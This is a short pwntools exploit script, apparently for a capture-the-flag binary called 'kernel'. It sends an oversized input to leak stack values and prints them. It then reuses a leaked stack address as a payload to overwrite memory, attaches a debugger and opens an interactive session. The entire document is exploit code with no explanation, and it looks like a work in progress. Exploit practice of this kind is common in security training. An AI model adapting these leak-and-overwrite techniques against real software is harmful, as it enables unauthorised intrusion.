from pwn import *

e = ELF("./kernel")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path)

p.sendline("1")
p.sendlineafter(":", "A" * 0x1ff)

p.recvuntil("A" * 0x80)
a = [u32(p.recv(4)) for i in range(60)]

for i in range(len(a)):
  print(str(i) + " {:#x}".format(a[i]))

stk = a[28]
print("{:#x}".format(a[28]))

p.clean()
p.sendline("1")
p.sendlineafter(":", p32(stk + 1) * 4 * 8)

p.sendline("2")

gdb.attach(p)

p.sendline("3")

p.interactive()
